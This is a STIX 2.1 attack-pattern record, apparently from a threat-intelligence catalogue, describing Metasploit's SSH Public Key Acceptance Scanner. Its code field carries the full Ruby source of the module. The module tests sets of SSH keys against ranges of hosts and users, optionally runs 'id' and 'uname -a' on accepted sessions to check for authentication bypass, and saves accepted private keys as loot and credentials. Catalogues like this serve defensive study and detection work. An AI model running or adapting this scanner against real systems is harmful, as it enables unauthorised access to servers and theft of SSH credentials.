{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--14cc4882-e38e-471b-a194-608a100eda19",
    "created": "2024-08-14T16:27:29.882378Z",
    "modified": "2024-08-14T16:27:29.882382Z",
    "name": "SSH Public Key Acceptance Scanner",
    "description": " This module can determine what public keys are configured for key-based authentication across a range of machines, users, and sets of known keys. The SSH protocol indicates whether a particular key is accepted prior to the client performing the actual signed authentication request. To use this module, a text file containing one or more SSH keys should be provided. These can be private or public, so long as no passphrase is set on the private keys.  If you have loaded a database plugin and connected to a database this module will record authorized public keys and hosts so you can track your process.  Key files may be a single public (unencrypted) key, or several public keys concatenated together as an ASCII text file. Non-key data should be silently ignored. Private keys will only utilize the public key component stored within the key file. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ssh/ssh_identify_pubkeys.rb",
            "external_id": "ssh_identify_pubkeys.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'sshkey' # TODO: Actually include this!\nrequire 'net/ssh/pubkey_verifier'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::SSH\n\n  def initialize\n    super(\n      'Name'        => 'SSH Public Key Acceptance Scanner',\n      'Description' => %q{\n        This module can determine what public keys are configured for\n        key-based authentication across a range of machines, users, and\n        sets of known keys. The SSH protocol indicates whether a particular\n        key is accepted prior to the client performing the actual signed\n        authentication request. To use this module, a text file containing\n        one or more SSH keys should be provided. These can be private or\n        public, so long as no passphrase is set on the private keys.\n\n        If you have loaded a database plugin and connected to a database\n        this module will record authorized public keys and hosts so you can\n        track your process.\n\n        Key files may be a single public (unencrypted) key, or several public\n        keys concatenated together as an ASCII text file. Non-key data should be\n        silently ignored. Private keys will only utilize the public key component\n        stored within the key file.\n      },\n      'Author'      => [\n        'todb',\n        'hdm',\n        'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>', # Reworked the storage (db, credentials, notes, loot) only\n       ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(22),\n        OptPath.new('KEY_FILE', [true, 'Filename of one or several cleartext public keys.'])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptBool.new('SSH_BYPASS', [ false, 'Verify that authentication was not bypassed when keys are found', false]),\n        OptString.new('SSH_KEYFILE_B64', [false, 'Raw data of an unencrypted SSH public key. This should be used by programmatic interfaces to this module only.', '']),\n        OptPath.new('KEY_DIR', [false, 'Directory of several keys. Filenames must not begin with a dot in order to be read.']),\n        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])\n      ]\n    )\n\n    deregister_options(\n      'RHOST','PASSWORD','PASS_FILE','BLANK_PASSWORDS','USER_AS_PASS', 'USERPASS_FILE', 'DB_ALL_PASS', 'DB_ALL_CREDS'\n    )\n\n    @good_credentials = {}\n    @good_key = ''\n    @strip_passwords = true\n\n  end\n\n  def key_dir\n    datastore['KEY_DIR']\n  end\n\n  def key_file\n    datastore['KEY_FILE']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def ip\n    datastore['RHOST']\n  end\n\n  def read_keyfile(file)\n    if file == :keyfile_b64\n      keyfile = datastore['SSH_KEYFILE_B64'].unpack(\"m*\").first\n    elsif file.kind_of? Array\n      keyfile = ''\n      file.each do |dir_entry|\n        next unless ::File.readable? dir_entry\n        keyfile << ::File.open(dir_entry, \"rb\") {|f| f.read(f.stat.size)}\n      end\n    else\n      keyfile = ::File.open(file, \"rb\") {|f| f.read(f.stat.size)}\n    end\n    keys = []\n    this_key = []\n    in_key = false\n    keyfile.split(\"\\n\").each do |line|\n      if /(?<key>ssh-(?:dss|rsa)\\s+.*)/ =~ line\n        keys << key\n        next\n      end\n      in_key = true if(line =~ /^-----BEGIN [RD]SA (PRIVATE|PUBLIC) KEY-----/)\n      this_key << line if in_key\n      if(line =~ /^-----END [RD]SA (PRIVATE|PUBLIC) KEY-----/)\n        in_key = false\n        keys << (this_key.join(\"\\n\") + \"\\n\")\n        this_key = []\n      end\n    end\n    if keys.empty?\n      print_error \"#{ip}:#{rport} SSH - No valid keys found\"\n    end\n    return validate_keys(keys)\n  end\n\n  # Validates that the key isn't total garbage, and converts PEM formatted\n  # keys to SSH formatted keys.\n  def validate_keys(keys)\n    keepers = []\n    keys.each do |key|\n      if key =~ /ssh-(dss|rsa)/\n        # A public key has been provided\n        keepers << { :public => key, :private => \"\" }\n        next\n      else\n        # Use the mighty SSHKey library from James Miller to convert them on the fly.\n        # This is where a PRIVATE key has been provided\n        ssh_version = SSHKey.new(key).ssh_public_key rescue nil\n        keepers << { :public => ssh_version, :private => key } if ssh_version\n        next\n      end\n\n      # Needs a beginning\n      next unless key =~ /^-----BEGIN [RD]SA (PRIVATE|PUBLIC) KEY-----\\x0d?\\x0a/m\n      # Needs an end\n      next unless key =~ /\\n-----END [RD]SA (PRIVATE|PUBLIC) KEY-----\\x0d?\\x0a?$/m\n      # Shouldn't have binary.\n      next unless key.scan(/[\\x00-\\x08\\x0b\\x0c\\x0e-\\x1f\\x80-\\xff]/).empty?\n      # Add more tests to test\n      keepers << { :public => key, :private => \"\" }\n    end\n    if keepers.empty?\n      print_error \"#{ip}:#{rport} SSH - No valid keys found\"\n    end\n    return keepers.uniq\n  end\n\n  def pull_cleartext_keys(keys)\n    cleartext_keys = []\n    keys.each do |key|\n      next unless key[:public]\n      next if key[:private] =~ /Proc-Type:.*ENCRYPTED/\n      this_key = { :public => key[:public].gsub(/\\x0d/,\"\"), :private => key[:private] }\n      next if cleartext_keys.include? this_key\n      cleartext_keys << this_key\n    end\n    if cleartext_keys.empty?\n      print_error \"#{ip}:#{rport} SSH - No valid cleartext keys found\"\n    end\n    return cleartext_keys\n  end\n\n  def do_login(ip, port, user)\n\n    if key_file && File.readable?(key_file)\n      keys = read_keyfile(key_file)\n      cleartext_keys = pull_cleartext_keys(keys)\n      msg = \"#{ip}:#{rport} SSH - Trying #{cleartext_keys.size} cleartext key#{(cleartext_keys.size > 1) ? \"s\" : \"\"} per user.\"\n    elsif datastore['SSH_KEYFILE_B64'] && !datastore['SSH_KEYFILE_B64'].empty?\n      keys = read_keyfile(:keyfile_b64)\n      cleartext_keys = pull_cleartext_keys(keys)\n      msg = \"#{ip}:#{rport} SSH - Trying #{cleartext_keys.size} cleartext key#{(cleartext_keys.size > 1) ? \"s\" : \"\"} per user (read from datastore).\"\n    elsif datastore['KEY_DIR']\n      return :missing_keyfile unless(File.directory?(key_dir) && File.readable?(key_dir))\n      unless @key_files\n        @key_files = Dir.entries(key_dir).reject {|f| f =~ /^\\x2e/}\n      end\n      these_keys = @key_files.map {|f| File.join(key_dir,f)}\n      keys = read_keyfile(these_keys)\n      cleartext_keys = pull_cleartext_keys(keys)\n      msg = \"#{ip}:#{rport} SSH - Trying #{cleartext_keys.size} cleartext key#{(cleartext_keys.size > 1) ? \"s\" : \"\"} per user.\"\n    else\n      return :missing_keyfile\n    end\n\n    unless @alerted_with_msg\n      print_status msg\n      @alerted_with_msg = true\n    end\n\n\n    cleartext_keys.each_with_index do |key_data,key_idx|\n\n      key_info  = \"\"\n      if key_data[:public] =~ /ssh\\-(rsa|dss)\\s+([^\\s]+)\\s+(.*)/\n        key_info = \"- #{$3.strip}\"\n      end\n\n      factory = ssh_socket_factory\n      opt_hash = {\n        :auth_methods    => ['publickey'],\n        :port            => port,\n        :key_data        => key_data[:public],\n        :use_agent       => false,\n        :config          => false,\n        :proxy           => factory,\n        :non_interactive => true,\n        :verify_host_key => :never\n      }\n\n      opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']\n\n      begin\n        ssh_socket = nil\n        success = false\n        verifier = Net::SSH::PubkeyVerifier.new(ip,user,opt_hash)\n        ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n           success = verifier.verify\n           ssh_socket = verifier.connection\n        end\n\n        if datastore['SSH_BYPASS'] and ssh_socket\n          data = nil\n\n          print_status(\"#{ip}:#{rport} SSH - User #{user} is being tested for authentication bypass...\")\n\n          begin\n            ::Timeout.timeout(5) { data = ssh_socket.exec!(\"help\\nid\\nuname -a\").to_s }\n          rescue ::Exception\n          end\n\n          print_brute(:level => :good, :msg => \"User #{user} successfully bypassed authentication: #{data.inspect} \") if data\n        end\n\n        ::Timeout.timeout(1) { ssh_socket.close if ssh_socket } rescue nil\n\n      rescue Rex::ConnectionError\n        return :connection_error\n      rescue Net::SSH::Disconnect, ::EOFError\n        return :connection_disconnect\n      rescue Net::SSH::AuthenticationFailed\n      rescue Net::SSH::Exception\n        return [:fail,nil] # For whatever reason.\n      end\n\n      unless success\n        if @key_files\n          print_brute :level => :verror, :msg =>  \"User #{user} does not accept key #{@key_files[key_idx+1]} #{key_info}\"\n        else\n          print_brute :level => :verror, :msg => \"User #{user} does not accept key #{key_idx+1} #{key_info}\"\n        end\n        return [:fail,nil]\n      end\n\n      key = verifier.key\n      key_fingerprint = key.fingerprint\n      user = verifier.user\n      private_key_present = (key_data[:private] != \"\") ? 'Yes' : 'No'\n\n      print_brute :level => :good, :msg => \"Public key accepted: '#{user}' with key '#{key_fingerprint}' (Private Key: #{private_key_present}) #{key_info}\"\n\n      key_hash = {\n        data: key_data,\n        key: key,\n        info: key_info\n      }\n      do_report(ip, rport, user, key_hash)\n\n    end\n  end\n\n  def do_report(ip, port, user, key)\n    return unless framework.db.active\n\n    store_public_keyfile(ip,user,key[:fingerprint],key[:data][:public])\n    private_key_present = (key[:data][:private]!=\"\") ? 'Yes' : 'No'\n\n    # Store a note relating to the public key test\n    note_information = {\n      user: user,\n      public_key: key[:data][:public],\n      private_key: private_key_present,\n      info: key[:info]\n    }\n    report_note(host: ip, port: port, type: \"ssh.publickey.accepted\", data: note_information, update: :unique_data)\n\n    if key[:data][:private] != \"\"\n      # Store these keys in loot\n      private_keyfile_path = store_private_keyfile(ip,user,key[:fingerprint],key[:data][:private])\n\n      # Use the proper credential method to store credentials that we have\n      service_data = {\n        address: ip,\n        port: port,\n        service_name: 'ssh',\n        protocol: 'tcp',\n        workspace_id: myworkspace_id\n      }\n\n      credential_data = {\n        module_fullname: self.fullname,\n        origin_type: :service,\n        private_data: key[:data][:private],\n        private_type: :ssh_key,\n        username: key[:key][:user],\n      }.merge(service_data)\n\n      login_data = {\n        core: create_credential(credential_data),\n        last_attempted_at: DateTime.now,\n        status: Metasploit::Model::Login::Status::SUCCESSFUL,\n        proof: private_keyfile_path\n      }.merge(service_data)\n      create_credential_login(login_data)\n    end\n  end\n\n  def existing_loot(ltype, key_id)\n    framework.db.loots(workspace: myworkspace).where(ltype: ltype).select {|l| l.info == key_id}.first\n  end\n\n  def store_public_keyfile(ip,user,key_id,key_data)\n    safe_username = user.gsub(/[^A-Za-z0-9]/,\"_\")\n    ktype = key_data.match(/ssh-(rsa|dss)/)[1] rescue nil\n    return unless ktype\n    ktype = \"dsa\" if ktype == \"dss\"\n    ltype = \"host.unix.ssh.#{user}_#{ktype}_public\"\n    keyfile = existing_loot(ltype, key_id)\n    return keyfile.path if keyfile\n    keyfile_path = store_loot(\n      ltype,\n      \"application/octet-stream\", # Text, but always want to mime-type attach it\n      ip,\n      (key_data + \"\\n\"),\n      \"#{safe_username}_#{ktype}.pub\",\n      key_id\n    )\n    return keyfile_path\n  end\n\n  def store_private_keyfile(ip,user,key_id,key_data)\n    safe_username = user.gsub(/[^A-Za-z0-9]/,\"_\")\n    ktype = key_data.match(/-----BEGIN ([RD]SA) (?:PRIVATE|PUBLIC) KEY-----/)[1].downcase rescue nil\n    return unless ktype\n    ltype = \"host.unix.ssh.#{user}_#{ktype}_private\"\n    keyfile = existing_loot(ltype, key_id)\n    return keyfile.path if keyfile\n    keyfile_path = store_loot(\n      ltype,\n      \"application/octet-stream\", # Text, but always want to mime-type attach it\n      ip,\n      (key_data + \"\\n\"),\n      \"#{safe_username}_#{ktype}.private\",\n      key_id\n    )\n    return keyfile_path\n  end\n\n  def run_host(ip)\n    # Since SSH collects keys and tries them all on one authentication session,\n    # it doesn't make sense to iteratively go through all the keys\n    # individually. So, ignore the pass variable, and try all available keys\n    # for all users.\n    each_user_pass do |user,pass|\n      ret, _ = do_login(ip, rport, user)\n      case ret\n      when :connection_error\n        vprint_error \"#{ip}:#{rport} SSH - Could not connect\"\n        :abort\n      when :connection_disconnect\n        vprint_error \"#{ip}:#{rport} SSH - Connection timed out\"\n        :abort\n      when :fail\n        vprint_error \"#{ip}:#{rport} SSH - Failed: '#{user}'\"\n      when :missing_keyfile\n        vprint_error \"#{ip}:#{rport} SSH - Cannot read keyfile\"\n      when :no_valid_keys\n        vprint_error \"#{ip}:#{rport} SSH - No readable keys in keyfile\"\n      end\n    end\n  end\nend\n"
}